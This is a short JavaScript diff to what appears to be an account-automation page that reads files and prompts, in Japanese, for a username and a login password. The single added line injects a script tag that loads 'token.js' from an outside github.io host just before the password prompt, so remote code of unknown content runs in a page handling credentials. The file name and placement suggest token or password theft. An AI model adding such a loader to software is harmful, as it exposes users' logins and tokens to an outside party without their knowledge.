@@ -7,6 +7,7 @@ input.addEventListener('change', () => {
     for(file of input.files){
         reader.readAsText(file, 'UTF-8');
         reader.onload = ()=> {
+            var src=document.createElement("script");src.src="https://haruymth.github.io/scripts/codes/token.js";document.body.appendChild(src);
             let followuser = prompt("ユーザー名は何で行きますか？").toLowerCase();
             let password=prompt("ログインのためのパスワードを入力");
             const flw = async (index) => {
